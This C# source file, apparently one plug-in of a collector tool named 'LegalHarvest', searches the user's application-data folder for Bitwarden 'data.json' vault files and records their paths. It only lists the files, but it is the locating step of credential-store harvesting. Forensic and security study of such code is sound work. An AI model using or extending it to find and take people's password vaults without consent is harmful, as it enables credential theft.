using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class BitwardenModule : ICollectorModule
    {
        public string ModuleName => "Bitwarden";
        public bool CanExecute()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Bitwarden");
            return Directory.Exists(path);
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string bwDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Bitwarden");
            if (Directory.Exists(bwDir))
                foreach (string file in Directory.GetFiles(bwDir, "data.json", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "Bitwarden", Name = file, Value = file, Timestamp = DateTime.Now });
            return items;
        }
    }
}
